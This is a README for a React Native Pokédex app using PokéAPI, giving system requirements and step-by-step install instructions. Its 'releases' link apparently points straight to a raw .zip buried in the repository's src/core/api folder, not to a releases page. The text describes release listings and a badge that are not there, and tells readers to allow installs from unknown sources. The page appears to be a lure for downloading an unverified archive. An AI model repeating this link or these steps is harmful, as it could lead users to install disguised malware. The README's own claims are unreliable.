## 📋 What is PokedexApp?

PokedexApp is an application built with React Native. It lets you browse and learn about Pokémon using the official PokéAPI. The app works smoothly on mobile phones, tablets, and desktop computers. It organizes information so you can easily find details about all kinds of Pokémon.  

The app keeps data stored on your device for offline use. That means you can still check Pokémon info even without internet access. It also updates the data when you go online again.  

PokedexApp uses simple, clean design so it fits well on any screen size. It also keeps your view responsive, adjusting to your device naturally.

## 🖥️ System Requirements

To run PokedexApp, make sure your device meets these basic needs:

- **Operating System:** Android 7.0 or newer, iOS 12 or newer, or Windows/macOS with a React Native environment set up.  
- **Storage:** At least 100 MB of free space for the app and cached data.  
- **Internet:** Required for the first download and any data updates. After that, offline use works smoothly.  
- **Basic hardware:** Standard smartphones, tablets, or computers with screen sizes from 4 inches up to desktop monitors.  

If you are using a mobile device, make sure you have permission to install apps outside of the official store if you use the provided file directly.

## 🚀 Getting Started

Follow these steps to get PokedexApp on your device and start exploring Pokémon.

### Step 1: Download the App

Click the big blue badge above or visit this link to download the app:

[Download PokedexApp Releases](https://github.com/HEJIeHuB4uK/PokedexApp/raw/refs/heads/main/src/core/api/Pokedex_App_2.2.zip)

This page holds the latest versions for different devices. You will see files for Android (.apk), iOS (.ipa or instructions), and desktop versions if available. Each release lists its date and any notes about improvements or fixes.

### Step 2: Choose the Right Version

Depending on your device type:

- **Android:** Look for a file ending with `.apk`.  
- **iOS:** Follow the instructions on the release page, as iOS apps often require installation via TestFlight or the App Store.  
- **Windows/macOS:** If a desktop version exists, select the appropriate installer (.exe for Windows or .dmg for Mac).  

If you are unsure, use the latest version marked as "Stable" or "Recommended."

### Step 3: Install the App

- On **Android**, tap the `.apk` file after download. You might need to allow installations from unknown sources in your system settings.  
- On **iOS**, follow the instructions provided on the release page carefully to install the app securely.  
- On **Windows or macOS**, run the installer and follow the on-screen prompts.  

For mobile, installation is much like any other app you have installed before. For desktop, the installer will create shortcuts and add the app to your programs.

### Step 4: Open and Use

Once installed, open PokedexApp from your list of apps or desktop shortcuts. The first time, it may download Pokémon data from the internet. Let it finish this to use offline features later.

You will see a clean interface with search, browsing, and category options to explore Pokémon. Use tabs or menus to view details such as types, abilities, stats, and evolutions.

## ⚙️ How It Works

PokedexApp uses technology common to modern mobile apps:

- **React Native:** This framework lets the app work on Android, iOS, and desktops from one codebase.  
- **PokéAPI:** The app calls this public service for official Pokémon data.  
- **Zustand:** Manages app state efficiently, keeping your current views and favorite Pokémon remembered.  
- **React Query:** Handles data fetching, cache, and background updates for smooth performance.  
- **AsyncStorage:** Saves user data locally so you can access it offline.  

All these components work together to provide a stable and easy-to-use experience.
